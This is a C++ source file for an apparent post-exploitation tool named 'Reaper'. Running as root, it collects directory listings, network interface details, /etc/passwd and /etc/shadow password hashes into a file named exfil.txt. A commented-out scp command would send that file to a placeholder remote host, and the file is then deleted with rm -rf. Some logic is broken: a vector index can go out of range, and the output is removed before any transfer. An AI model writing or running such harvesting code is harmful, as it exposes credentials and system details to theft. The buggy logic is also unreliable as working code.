#include <sstream>
#include <iostream>
#include <cstdlib>
#include <cstdio>
#include <unistd.h> // For geteuid()
#include <fstream>
#include <thread>
#include <chrono>
#include <vector>

using namespace std;

// Function to check if the script has root privileges
int checkPrivs() {
    return (geteuid() == 0) ? 0 : 1;
}

using namespace std;

// Function to execute a command and return the output
std::string systemIO(const std::string& cmd) {
    FILE* fp = popen(cmd.c_str(), "r");
    if (fp == nullptr) {
        std::cerr << "Failed to run command." << std::endl;
        return "";
    }

    std::string output;
    char buffer[128];

    while (fgets(buffer, sizeof(buffer), fp) != nullptr) { // Read all output
        output += buffer;
    }

    pclose(fp);
    return output;
}

int main() {

    if(checkPrivs() != 0){
        cerr << "Reaper is not root" << endl;
        return 1;
    }

    std::ifstream inFile("txt.txt"); // Ensure file can be opened
    if (!inFile.is_open()) {
        std::cerr << "Could not open file for reading." << std::endl;
        return 1;
    }

    vector<string> lines;
    string line;
    while (getline(inFile, line)) { // Collect all lines from the file
        lines.push_back(line);
    }

    inFile.close();

    // Ensure the vector has enough space before assigning values
    if (lines.size() < 5) {
        lines.resize(6); // Resize to have at least 5 elements
    }

    // System commands (Linux equivalents)
    std::string cmd = "ls /"; // Lists the root directory
    lines[0] = "Root Dir: \n" + systemIO(cmd); // Avoid out-of-range access by resizing vector first

    cmd = "ls /home/"; // Lists the root directory
    lines[1] = "Home Dir: \n" + systemIO(cmd); // Avoid out-of-range access by resizing vector first

    cmd = "ip addr"; // Displays network interfaces and addresses
    lines[2] = "IP and Interface Info: \n" + systemIO(cmd);

    cmd = "cat /etc/passwd"; // Displays system users
    lines[3] = "User Info: \n" + systemIO(cmd);

    
    cmd = "cat /etc/shadow"; // Sensitive file; should only be accessible with proper privileges
    lines[4] = "/etc/shadow: \n" + systemIO(cmd);

    std::string user = systemIO("whoami"); // Get current user
    lines[5] = "User: " + user; // Set the user information

    //cmd = "scp exfil.txt -P 2222 remote@<target_ip>:/remote/directory/";
    //systemIO(cmd);



    // Rewrite the content to the output file
    std::ofstream outFile("exfil.txt"); // Ensure file can be opened for writing
    if (!outFile.is_open()) {
        std::cerr << "Could not open file for writing." << std::endl;
        return 1;
    }

    for (const auto& l : lines) {
        outFile << l << std::endl;
    }

    outFile.close();

    cmd = "rm -rf exfil.txt";
    systemIO(cmd);

    return 0; // Success
}

